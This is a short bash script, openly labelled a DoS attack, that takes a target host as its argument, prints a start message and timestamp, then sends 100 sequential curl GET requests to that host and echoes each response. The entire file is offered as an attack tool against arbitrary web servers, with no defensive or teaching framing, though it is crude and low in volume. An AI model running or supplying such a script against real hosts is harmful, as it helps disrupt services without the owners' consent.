#!/usr/bin/env bash


# get host to perform attack
HOST=$1

# message
echo "Starting DoS attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

# make a loop to perform DoS attack
for _ in {1..100}
do
  TMP=$(curl -X GET "$HOST")
  echo Got: "$TMP"
done

exit 0;